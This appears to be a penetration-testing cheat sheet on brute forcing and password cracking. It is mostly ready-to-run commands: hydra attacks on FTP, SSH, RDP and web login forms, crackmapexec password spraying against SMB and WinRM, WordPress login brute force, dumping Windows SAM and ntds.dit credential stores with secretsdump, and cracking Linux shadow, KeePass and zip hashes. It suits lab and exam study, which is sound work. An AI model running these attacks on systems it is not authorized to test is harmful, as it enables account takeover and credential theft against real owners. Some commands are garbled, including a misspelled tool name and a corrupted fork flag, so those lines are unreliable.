# Brute Forcing/Decrypting & Cracking 

**<u>Useful wordlists:</u>**

> /usr/share/wordlists/rockyou.txt
> /usr/share/wordlists/wfuzz/others/common_pass.txt
>
> In seclists-pkg:
>
> /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
>  /usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
>  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

**<u>Creating a custom wordlist:</u>**

```bash
#create a custom password list named passwords

hashcat --force passwords -r /usr/share/hashcat/rules/best64.rule --stdout > t

#sort the password list
sort -u t > passwords

#creating new rules for wordlist
vim append_exclamation.rule
#inside the file
:
$!

hashcat --force passwords -r /usr/share/hashcat/rules/best64.rule -r append_exclamation.rule --stdout > t

#creating custom user names
git clone https://github.com/urbanadventurer/username-anarchy.git

./username-anarchy --input-file [usernames.list] --select-format first,first.last,f.last,flast
```

**<u>Creating a wordlist out of a website:</u>**

```bash
cewl http://10.11.1.39/otrs/index.pl -w passlist.txt

#-d is depth, -m is mininum length 
cewl -d 7 -m 8 --with-numbers -w passlist.txt http://$ip
```

**<u>Hashcat Decrypting:</u>** (see https://hashcat.net/wiki/doku.php?id=example_hashes for hash codes)

```bash
hash-identifier

hashcat -m [id] -a 0 [hash] /usr/share/wordlists/rockyou.txt --force

hashcat -m 1000 -a 0 --quiet --potfile-disable local.hash /usr/share/wordlists/rockyou.txt 
```

**<u>FTP:</u>**

```bash
hydra -l [username] -P /usr/share/wordlists/rockyou.txt -f 192.168.52.103 ftp -V -s [port]
```

<u>**SAMBA/WINRM:**</u>

```bash
crackmapexec smb $ip --pass-pol
#make sure password doesn't lock out and there is a minimum 
crackmapexec smb $ip -u users.txt -p passwords

#with creds
crackmapexec smb $ip -u user -p password --shares

crackmapexec winrm $ip -u users.txt -p passwords
```

**<u>SSH/RDP:</u>**

```bash
hydra -V -f -l username -P /usr/share/wordlists/rockyou.txt  ssh://$ip

hydra -V -f -l username -P /usr/share/wordlists/rockyou.txt  rdp://$ip
```

**<u>Web post form:</u>**

```bash
hydra $ip http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server" -vV -l root -f -P /usr/share/wordlists/rockyou.txt  

hydra "http-post-form://10.11.1.222:8080/blog/adminlogin.jsp:username=admin&password=^PASS^:S=302" -l admin -P /usr/share/wordlists/fasttrack.txt -vV -f
```

**<u>Wordpress:</u>**

```bash
wpscan --url http://$ip/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt 
```

**<u>Cracking Linux Hashes:</u>**

With */etc/passwd/* & with */etc/shadow*

```bash
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```



**<u>Cracking Windows Hashes:</u>**

```bash
#must have admin priv
reg save hklm\sam .\sam
reg save hklm\system .\system
reg save hklm\security .\security

#transfer to kali then on kali:
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
#OR
samdump2 System SAM
#----------------------------------------------------------------------------------
#using system.bak AND ntds.dit
reg save hklm\system c:\windows\temp\system.bak
#on PowerShell
Copy-FileSeBackupPrivilege e:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit

#may need missing dlls: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

#on kali:
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL >> hashes.txt
```



**<u>Cracking KDBX files:</u>**

```bash
keepass2john CEH.kdbx
keepass2john CEH.kdbx > CEH-CrackMe
john CEH-CrackMe --wordlist=/usr/share/wordlists/rockyou.txt â€” fork=4
#OR
haschcat -m 13400 CEH-Crackme /usr/share/wordlists/rockyou.txt --force --show
```



**<u>Cracking Zip files:</u>**

```bash
zip2john file.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```



**<u>Bruteforcing Hostnames</u>**

```bash
gobuster vhost /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u $ip
```

**<u>Spraying</u>**

```bash
git clone https://github.com/byt3bl33d3r/SprayingToolkit.git

python3 atomizer.py owa [ip] [password] [userfile]
```

